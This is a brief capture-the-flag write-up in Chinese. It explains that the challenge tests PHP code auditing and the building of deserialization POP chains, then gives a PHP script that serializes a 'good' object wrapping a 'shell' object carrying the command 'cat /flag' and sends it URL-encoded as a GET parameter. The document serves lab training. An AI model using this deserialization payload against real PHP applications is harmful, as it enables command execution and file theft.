题目制作理念：
考察php代码审计能力、反序列化pop链的构造
writeup:
exp:

``` php
<?php
class good {
    protected $a;
    function __construct() {
        $this->a = new shell();
    }
}
class shell {
    private $data = "cat /flag";
}
echo urlencode(serialize(new good()));
```
将得到的结果通过get传参即可得到flag

